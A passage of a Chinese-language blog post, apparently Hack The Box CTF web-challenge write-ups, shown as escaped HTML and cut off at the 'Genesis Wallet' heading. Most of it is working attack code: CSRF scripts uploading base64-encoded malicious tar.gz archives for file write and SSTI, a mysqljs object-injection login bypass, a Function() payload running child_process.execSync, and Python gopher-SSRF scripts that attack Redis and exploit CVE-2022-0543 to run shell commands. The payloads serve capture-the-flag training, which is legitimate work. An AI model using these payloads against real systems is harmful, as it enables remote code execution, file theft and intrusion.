class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">        xhr.open(<span class=\"string\">&quot;POST&quot;</span>, <span class=\"string\">&quot;http://localhost:1337/api/firmware/upload&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Accept&quot;</span>, <span class=\"string\">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Accept-Language&quot;</span>, <span class=\"string\">&quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;multipart/form-data; boundary=----WebKitFormBoundarypXheHIDWfea2zg7D&quot;</span>);</span><br><span class=\"line\">        xhr.withCredentials = <span class=\"string\">&quot;true&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> body = </span><br><span class=\"line\">          <span class=\"string\">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;Content-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;run.tar.gz\\&quot;\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;Content-Type: application/x-gzip\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;\\r\\n&quot;</span> +<span class=\"built_in\">decodeURIComponent</span>(atob(<span class=\"string\">&quot;H4sICNGNg2IC/3J1bi50YXIA7dLRasMgFAZgr30K75pAMKYJFQZ5i90H07hWaGIwx619+5rAGHSwXW0w9n8iB44/B0SlLKUszTyXIU5yvrEfoBKt9VaTx6r2WrGq2TdKq4OuUq6qm+rAhGK/IC5kghAseE9f5b47f7zcH/ES/CjS81/c0ZDzkxyNm4QbZx9o7fNPgcGQ6c1i30OjOwVDtht6zt8cndewTLs7+onslbL8iYvkI5flnK+h9OOys1+o3Sm5rV0h1pFtVde6EIPt46l9DtEWIi62s6/mYq9bI+cMAAAAAAAAAAAAAAAAAAAAAADgn7sDYnNphwAoAAA=&quot;</span>).replace(<span class=\"regexp\">/%/g</span>, <span class=\"string\">&#x27;%25&#x27;</span>))+</span><br><span class=\"line\">          <span class=\"string\">&quot;\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D--\\r\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> aBody = <span class=\"keyword\">new</span> <span class=\"built_in\">Uint8Array</span>(body.length);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; aBody.length; i++)</span><br><span class=\"line\">          aBody[i] = body.charCodeAt(i);</span><br><span class=\"line\">        xhr.send(<span class=\"keyword\">new</span> Blob([aBody]));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">\t  submitRequest();</span><br><span class=\"line\">\t&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>routes.py</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">python2 eval.py routes.py -p app&#x2F;application&#x2F;blueprints -d 2 -o unix -f routes.tar.gz</span><br></pre></td></tr></table></figure>\n\n\n\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">submitRequest</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">      </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">        xhr.open(<span class=\"string\">&quot;POST&quot;</span>, <span class=\"string\">&quot;http://localhost:1337/api/firmware/upload&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Accept&quot;</span>, <span class=\"string\">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Accept-Language&quot;</span>, <span class=\"string\">&quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;multipart/form-data; boundary=----WebKitFormBoundarypXheHIDWfea2zg7D&quot;</span>);</span><br><span class=\"line\">        xhr.withCredentials = <span class=\"string\">&quot;true&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> body = </span><br><span class=\"line\">          <span class=\"string\">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;Content-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;routes.tar.gz\\&quot;\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;Content-Type: application/x-gzip\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;\\r\\n&quot;</span> +<span class=\"built_in\">decodeURIComponent</span>(atob(<span class=\"string\">&quot;H4sICLGFg2IC/3JvdXRlcy50YXIA7Vffi+M2EM5z/grdkxwwTnZv2YUDw1LoHfdQWnq9p2UxcqQk6tmWK8mbpqX/+40ky7EdZ7Mcy5UDfbAbWzOaH5pvJDlJlkmyJHVt/gq+JpqLapkXDaslr7RaStFoppL6MPtmrAB3d3f2FzD+vVtdX8+ubq5vzNPt26vZ6np1e3U7Q6vZd0CjNJEIzaQQ+jm9S/Jxcj8IeFkLqdGfSlTzjRQl6tEgoUSTnCiGWq3PiskYveey3BPJYvQ7M8MxonmMSr6VRLOM5qd2Gs0Lb4OrjNCSVzFif2tJ1jrbtPbcvE1B1Bev/JPnYWwj5JtDjCSjXLK1Nk8VZTLTrKwLcG0G/mqY0j1DWSG2vPLm1o2EOTprbB5WlJk5YI/6904GvLcvp+nkQnuLT1xxDTbMy3y+ZzlKj0FHGAZwjLKsIiXLssWc1HyoAAMDhTllG0hD1aJSLCqZUmTLFu/mCCCZbmTlFyL6F7di/A61T/+BgXvwmdimjfASbJdM7wRV6QP+8PMf+HFhPdhUo6Hd0WpG2ColO10WeGxX7VhR4HjStpWd2G4zwjuy/pIfDqtqa41C/p1R628Q8W+/furMmlJkg7j5BlVQibboCRDLLI2TTfr+hSvFqy3yJUc1kbDumkn1Bi9idLO6mtvZhvdQJ295y7Q1HS2s1ERi6gUaRtGII+wHIX6MnV5NlNoLSQd6frDV6yfS2RXSvnvV18jI2IY4TAMnkJQ8JBtegFqWHyLvN/UPCxBKpaPT8Hxo5jk55pe+JNaP1RMpOB2k6ae1wb51Do+NaGNbTDPJ5IJIo3fQ0aYzIXvVrNfQCZumKA5vTkgr2ZYryPlcU3j5pb7wesfW6LN40ssJkZ2WtPtJ4PN357ORPBOGo1YhGaEHOKagUiP3FdtnvRBOXcZdtql/cItI80QBRc0xQiiNvKET4VqUJe9Cno7QU+0i8ylRu1wQqNJifj889iwlO/kl6neK09z3J/mygLim2mzKuZ+UmUk+gMEgrLK/c7TFJuaEmToUH6TYJ1pklK/BFtoA9WAEwRVgYPHxbOTuKJ9s3qngnXoGtG3Y/93HpaBNwTI+bNButNfJNtyBlh2Z6OGjzbaJreJr5GKY71YPAnEXyajzlnZPsfOY2v9xu96MQp+n/dtc0vX6uS5zMy/0Wf8651e1u9eebcaPdjl9aBO9OMm0pi4EoS9i2r2/NA8bpqmp6coj7TBsggy7OlUdTcygeo2StRd2WDYo2fj2Hg3cPbhQHhc+tOPcZyLxXY5cZpAE1xwuDf+MVjXB50rxSZjVNNnsgRpoL0W1hb24YOYrRssDIlvCq+N1Y3RBeOJs/5J9a1gQN6+jjUvQUVp15D63c01cL4w1t8F6wqu0NTfe2d13yplt3Ql9QL1PmnEE7oPKfC+A/VlAQEBAQEBAQEBAQEBAQEBAQEBAQEBAwA+Or6sUNcQAKAAA&quot;</span>).replace(<span class=\"regexp\">/%/g</span>, <span class=\"string\">&#x27;%25&#x27;</span>))+</span><br><span class=\"line\">          <span class=\"string\">&quot;\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D--\\r\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> aBody = <span class=\"keyword\">new</span> <span class=\"built_in\">Uint8Array</span>(body.length);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; aBody.length; i++)</span><br><span class=\"line\">          aBody[i] = body.charCodeAt(i);</span><br><span class=\"line\">        xhr.send(<span class=\"keyword\">new</span> Blob([aBody]));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">\t  submitRequest();</span><br><span class=\"line\">\t&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>TMD，REtard师傅，我的超人！一句话点破我，现在存在任意文件写，不访问 register.html，绕过模板缓存，直接POST注册用户，然后写文件，再去房访问 register.html 成功SSTI！</p>\n<p>注册用户：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518110753948.png\" alt=\"image-20220518110753948\"></p>\n<p>构造恶意zip：</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518110611626.png\" alt=\"image-20220518110611626\"></p>\n<p>CSRF：</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\">&lt;script&gt;</span><br><span class=\"line\">      <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">submitRequest</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">      </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> xhr = <span class=\"keyword\">new</span> XMLHttpRequest();</span><br><span class=\"line\">        xhr.open(<span class=\"string\">&quot;POST&quot;</span>, <span class=\"string\">&quot;http://localhost:1337/api/firmware/upload&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Accept&quot;</span>, <span class=\"string\">&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Accept-Language&quot;</span>, <span class=\"string\">&quot;de-de,de;q=0.8,en-us;q=0.5,en;q=0.3&quot;</span>);</span><br><span class=\"line\">        xhr.setRequestHeader(<span class=\"string\">&quot;Content-Type&quot;</span>, <span class=\"string\">&quot;multipart/form-data; boundary=----WebKitFormBoundarypXheHIDWfea2zg7D&quot;</span>);</span><br><span class=\"line\">        xhr.withCredentials = <span class=\"string\">&quot;true&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> body = </span><br><span class=\"line\">          <span class=\"string\">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;Content-Disposition: form-data; name=\\&quot;file\\&quot;; filename=\\&quot;register.tar.gz\\&quot;\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;Content-Type: application/x-gzip\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;\\r\\n&quot;</span> +<span class=\"built_in\">decodeURIComponent</span>(atob(<span class=\"string\">&quot;H4sICIRihGIC/3JlZ2lzdGVyLnRhcgDt0s1qAyEQB3DPeQpvm1xG3Xzsre9RSlnM1mwEo6JTKIS8e+0eU2ihlELh/wOZYZzLDEOkiJTN+eMFP1n2KSp2lxwsu6qKm31lV+jMlyB+RjfDMCyxuY/aHIwwu35n9MGY7V7o3vTbQUgt/sBrZVukFCUl/qrvu//74f6J63VK8eRnGscp2FrHsWU+el6SOaSjDa341KXaPVNO2cV1165EqlOwM/Ebywf56X7aTtlP6lHHpaXbUHH2Zb253VYCAAAAAAAAAAAAAAAAAAAAAAAAfsM7tQhSNgAoAAA=&quot;</span>).replace(<span class=\"regexp\">/%/g</span>, <span class=\"string\">&#x27;%25&#x27;</span>))+</span><br><span class=\"line\">          <span class=\"string\">&quot;\\r\\n&quot;</span> +</span><br><span class=\"line\">          <span class=\"string\">&quot;------WebKitFormBoundarypXheHIDWfea2zg7D--\\r\\n&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">var</span> aBody = <span class=\"keyword\">new</span> <span class=\"built_in\">Uint8Array</span>(body.length);</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"keyword\">var</span> i = <span class=\"number\">0</span>; i &lt; aBody.length; i++)</span><br><span class=\"line\">          aBody[i] = body.charCodeAt(i);</span><br><span class=\"line\">        xhr.send(<span class=\"keyword\">new</span> Blob([aBody]));</span><br><span class=\"line\">      &#125;</span><br><span class=\"line\">\t  submitRequest();</span><br><span class=\"line\">\t&lt;/script&gt;</span><br></pre></td></tr></table></figure>\n\n<p>访问 /register：空白，成功了</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518111443527.png\" alt=\"image-20220518111443527\"></p>\n<p>再访问 url/static/Y0ng.txt</p>\n<p>FLAG：HTB{des3r1aliz3_4ll_th3_th1ngs}</p>\n<p>看这flag，这种解法是非预期了？</p>\n<h1 id=\"Spiky-Tamagotchy\"><a href=\"#Spiky-Tamagotchy\" class=\"headerlink\" title=\"Spiky Tamagotchy\"></a>Spiky Tamagotchy</h1><p>可以看到/interface路由下的函数功能直接拼接到 Function()中，明显可以rce，开始debug</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517202041248.png\" alt=\"image-20220517202041248\"></p>\n<p>但是前面有个登录页面，不知道任何的用户信息，而且没有注册功能</p>\n<p>登录处理：使用了占位符防止注入</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517231405348.png\" alt=\"image-20220517231405348\"></p>\n<p>另外有 JWT 的检查</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220517231451361.png\" alt=\"image-20220517231451361\"></p>\n<p>这两个东西让我不知道怎么绕过他们，这道题我尝试了一下午，最终找到一篇绕过文章写的非常详细：<a href=\"https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4\">https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4</a></p>\n<p>利用nodejs中类型的处理进行绕过，payload</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;username&quot;:&quot;admin&quot;,&quot;password&quot;:&#123;&quot;password&quot;:1&#125;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会导致最终查询的语句变为</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#39;SELECT username FROM user WHERE username &#x3D; &#39;admin&#39; AND password &#x3D; &#96;password&#96; &#x3D; 1&#39;</span><br></pre></td></tr></table></figure>\n\n<p>针对不同类型进行不同的转移处理，这里处理Object，看到返回的sql</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518085101326.png\" alt=\"image-20220518085101326\"></p>\n<p>最后拼接sql语句</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518085215514.png\" alt=\"image-20220518085215514\"></p>\n<p>登录成功</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518084946419.png\" alt=\"image-20220518084946419\"></p>\n<p>构造 payload，类似命令注入</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">&#123;&quot;activity&quot;:&quot;123&#39;)&#123;if(a&#x3D;&#39;123&#39;)&#123;a&#x3D;&#39;234&#39;&#125; return global.process.mainModule.constructor._load(&#39;child_process&#39;).execSync(&#39;cat &#x2F;flag.txt &gt; &#x2F;app&#x2F;static&#x2F;test.txt&#39;)&#125;;with(a&#x3D;&#39;1&quot;,&quot;health&quot;:&quot;50&quot;,&quot;weight&quot;:&quot;42&quot;,&quot;happiness&quot;:&quot;50&quot;&#125;</span><br></pre></td></tr></table></figure>\n\n<p>FLAG：HTB{3sc4p3d_bec0z_n0_typ3_ch3ck5}</p>\n<h1 id=\"Red-Island\"><a href=\"#Red-Island\" class=\"headerlink\" title=\"Red Island\"></a>Red Island</h1><ul>\n<li>认证redis</li>\n<li>CVE-2022-0543</li>\n</ul>\n<p>/app/index.js 这里存在redis的认证密码</p>\n<figure class=\"highlight js\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">require</span>(<span class=\"string\">&quot;express&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> app = express();</span><br><span class=\"line\"><span class=\"keyword\">const</span> session = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;express-session&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> RedisStore = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;connect-redis&quot;</span>)(session);</span><br><span class=\"line\"><span class=\"keyword\">const</span> path = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;path&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> cookieParser = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;cookie-parser&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> nunjucks = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;nunjucks&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> routes = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;./routes&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> Database = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;./database&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> &#123; createClient &#125; = <span class=\"built_in\">require</span>(<span class=\"string\">&quot;redis&quot;</span>);</span><br><span class=\"line\"><span class=\"keyword\">const</span> redisClient = createClient(&#123; <span class=\"attr\">legacyMode</span>: <span class=\"literal\">true</span> &#125;);</span><br><span class=\"line\"><span class=\"keyword\">const</span> db = <span class=\"keyword\">new</span> Database(<span class=\"string\">&quot;redisland.db&quot;</span>);</span><br><span class=\"line\">app.use(express.json());</span><br><span class=\"line\">app.use(cookieParser());</span><br><span class=\"line\">redisClient.connect().catch(<span class=\"built_in\">console</span>.error);</span><br><span class=\"line\">app.use(</span><br><span class=\"line\">  session(&#123;</span><br><span class=\"line\">    store: <span class=\"keyword\">new</span> RedisStore(&#123; <span class=\"attr\">client</span>: redisClient &#125;),</span><br><span class=\"line\">    saveUninitialized: <span class=\"literal\">false</span>,</span><br><span class=\"line\">    secret: <span class=\"string\">&quot;r4yh4nb34t5B1gM4c&quot;</span>,</span><br><span class=\"line\">    resave: <span class=\"literal\">false</span>,</span><br><span class=\"line\">  &#125;)</span><br><span class=\"line\">);</span><br><span class=\"line\"></span><br><span class=\"line\">nunjucks.configure(<span class=\"string\">&quot;views&quot;</span>, &#123; <span class=\"attr\">autoescape</span>: <span class=\"literal\">true</span>, <span class=\"attr\">express</span>: app &#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">app.set(<span class=\"string\">&quot;views&quot;</span>, <span class=\"string\">&quot;./views&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(<span class=\"string\">&quot;/static&quot;</span>, express.static(path.resolve(<span class=\"string\">&quot;static&quot;</span>)));</span><br><span class=\"line\"></span><br><span class=\"line\">app.use(routes(db));</span><br><span class=\"line\"></span><br><span class=\"line\">app.all(<span class=\"string\">&quot;*&quot;</span>, <span class=\"function\">(<span class=\"params\">req, res</span>) =&gt;</span> &#123;</span><br><span class=\"line\">  <span class=\"keyword\">return</span> res.status(<span class=\"number\">404</span>).send(&#123; <span class=\"attr\">message</span>: <span class=\"string\">&quot;404 page not found&quot;</span> &#125;);</span><br><span class=\"line\">&#125;);</span><br><span class=\"line\"></span><br><span class=\"line\">(<span class=\"keyword\">async</span> () =&gt; &#123;</span><br><span class=\"line\">  <span class=\"keyword\">await</span> db.connect();</span><br><span class=\"line\">  <span class=\"keyword\">await</span> db.migrate();</span><br><span class=\"line\">  app.listen(<span class=\"number\">1337</span>, <span class=\"string\">&quot;0.0.0.0&quot;</span>, <span class=\"function\">() =&gt;</span> <span class=\"built_in\">console</span>.log(<span class=\"string\">&quot;Listening on port 1337&quot;</span>));</span><br><span class=\"line\">&#125;)();</span><br></pre></td></tr></table></figure>\n\n<p>看到 /app/routers/index.js 提供图片下载功能</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518114745346.png\" alt=\"image-20220518114745346\"></p>\n<p>看下 /app/helpers/ImageDownloader.js，其中使用了 node-libcurl 这个库，翻看文档支持协议有</p>\n<blockquote>\n<p>支持 DICT、FILE、FTP、FTPS、Gopher、HTTP、HTTPS、IMAP、IMAPS、LDAP、LDAPS、POP3、POP3S、RTMP、RTSP、SCP、 SFTP、SMTP、SMTPS、Telnet 和 TFTP</p>\n</blockquote>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518114814858.png\" alt=\"image-20220518114814858\"></p>\n<p>然后按照之前题目的文件构造读了一下其他文件，没啥用，总结下来就是打认证redis</p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\">protocol = <span class=\"string\">&quot;gopher://&quot;</span></span><br><span class=\"line\">ip = <span class=\"string\">&quot;localhost&quot;</span></span><br><span class=\"line\">port = <span class=\"string\">&quot;6379&quot;</span></span><br><span class=\"line\">shell = <span class=\"string\">&quot;\\n\\ntest\\n\\n&quot;</span></span><br><span class=\"line\">filename = <span class=\"string\">&quot;test.txt&quot;</span></span><br><span class=\"line\">path = <span class=\"string\">&quot;/app/static&quot;</span></span><br><span class=\"line\">passwd = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">cmd = [<span class=\"string\">&quot;auth r4yh4nb34t5B1gM4c&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;flushall&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;set 1 &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(shell.replace(<span class=\"string\">&quot; &quot;</span>,<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class=\"line\">\t<span class=\"string\">&quot;config set dir &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(path),</span><br><span class=\"line\">\t<span class=\"string\">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(filename),</span><br><span class=\"line\">\t<span class=\"string\">&quot;save&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;quit&quot;</span></span><br><span class=\"line\">\t]</span><br><span class=\"line\"><span class=\"keyword\">if</span> passwd:</span><br><span class=\"line\">\tcmd.insert(<span class=\"number\">0</span>,<span class=\"string\">&quot;AUTH &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(passwd))</span><br><span class=\"line\">payload = protocol + ip + <span class=\"string\">&quot;:&quot;</span> + port + <span class=\"string\">&quot;/_&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">redis_format</span>(<span class=\"params\">arr</span>):</span></span><br><span class=\"line\">\tCRLF = <span class=\"string\">&quot;\\r\\n&quot;</span></span><br><span class=\"line\">\tredis_arr = arr.split(<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">\tcmd = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">\tcmd += <span class=\"string\">&quot;*&quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(redis_arr))</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> redis_arr:</span><br><span class=\"line\">\t\tcmd += CRLF + <span class=\"string\">&quot;$&quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>((x.replace(<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>,<span class=\"string\">&quot; &quot;</span>))))+CRLF+x.replace(<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>,<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">\tcmd += CRLF</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> cmd</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> cmd:</span><br><span class=\"line\">\t\tpayload += urllib.parse.quote(redis_format(x))</span><br><span class=\"line\">\tprint(payload)</span><br><span class=\"line\">\t<span class=\"comment\">#print(urllib.parse.quote(payload))  urlencode</span></span><br></pre></td></tr></table></figure>\n\n\n\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518133746593.png\" alt=\"image-20220518133746593\"></p>\n<p>访问之后，确实可以写文件</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/htb/image-20220518133827324.png\" alt=\"image-20220518133827324\"></p>\n<p>发现是redis5.0.7，那就是 CVE-2022-0543 喽，<a href=\"https://github.com/vulhub/vulhub/blob/master/redis/CVE-2022-0543/README.zh-cn.md\">vulhub/README.zh-cn.md at master · vulhub/vulhub (github.com)</a></p>\n<p>更换exp：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> urllib.parse</span><br><span class=\"line\"></span><br><span class=\"line\">protocol = <span class=\"string\">&quot;gopher://&quot;</span></span><br><span class=\"line\">ip = <span class=\"string\">&quot;localhost&quot;</span></span><br><span class=\"line\">port = <span class=\"string\">&quot;6379&quot;</span></span><br><span class=\"line\">shell = <span class=\"string\">&quot;&quot;&quot;local io_l = package.loadlib(&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;, &quot;luaopen_io&quot;); local io = io_l(); local f = io.popen(&quot;cat /root/flag &gt; /app/static/rce.txt&quot;, &quot;w&quot;); local res = f:read(&quot;*a&quot;); f:close(); return res&quot;&quot;&quot;</span></span><br><span class=\"line\">filename = <span class=\"string\">&quot;test.txt&quot;</span></span><br><span class=\"line\">path = <span class=\"string\">&quot;/app/static&quot;</span></span><br><span class=\"line\">passwd = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">cmd = [</span><br><span class=\"line\">    <span class=\"string\">&quot;auth r4yh4nb34t5B1gM4c&quot;</span>,</span><br><span class=\"line\">\t<span class=\"string\">&quot;eval &#123;&#125; 0&quot;</span>.<span class=\"built_in\">format</span>(shell.replace(<span class=\"string\">&quot; &quot;</span>,<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class=\"line\">\t]</span><br><span class=\"line\"><span class=\"keyword\">if</span> passwd:</span><br><span class=\"line\">\tcmd.insert(<span class=\"number\">0</span>,<span class=\"string\">&quot;AUTH &#123;&#125;&quot;</span>.<span class=\"built_in\">format</span>(passwd))</span><br><span class=\"line\">payload = protocol + ip + <span class=\"string\">&quot;:&quot;</span> + port + <span class=\"string\">&quot;/_&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">redis_format</span>(<span class=\"params\">arr</span>):</span></span><br><span class=\"line\">\tCRLF = <span class=\"string\">&quot;\\r\\n&quot;</span></span><br><span class=\"line\">\tredis_arr = arr.split(<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">\tcmd = <span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\">\tcmd += <span class=\"string\">&quot;*&quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>(redis_arr))</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> redis_arr:</span><br><span class=\"line\">\t\tcmd += CRLF + <span class=\"string\">&quot;$&quot;</span> + <span class=\"built_in\">str</span>(<span class=\"built_in\">len</span>((x.replace(<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>,<span class=\"string\">&quot; &quot;</span>))))+CRLF+x.replace(<span class=\"string\">&quot;$&#123;IFS&#125;&quot;</span>,<span class=\"string\">&quot; &quot;</span>)</span><br><span class=\"line\">\tcmd += CRLF</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> cmd</span><br><span class=\"line\"><span class=\"keyword\">if</span> __name__==<span class=\"string\">&quot;__main__&quot;</span>:</span><br><span class=\"line\">\t<span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> cmd:</span><br><span class=\"line\">\t\tpayload += urllib.parse.quote(redis_format(x))</span><br><span class=\"line\">\tprint(payload)</span><br><span class=\"line\">\t<span class=\"comment\">#print(urllib.parse.quote(payload))  urlencode</span></span><br></pre></td></tr></table></figure>\n\n<p>FLAG：HTB{r3d_righ7_h4nd_t0_th3_r3dis_land!}</p>\n<h1 id=\"Genesis-Wallet\"><a href=\"#Genesis-Wallet\" class=\"headerlink\" title=\"Genesis Wallet\"></a>Genesis Wallet</h1><p>登录需要使用OTP验证，使用在线</p>\n<p> <a 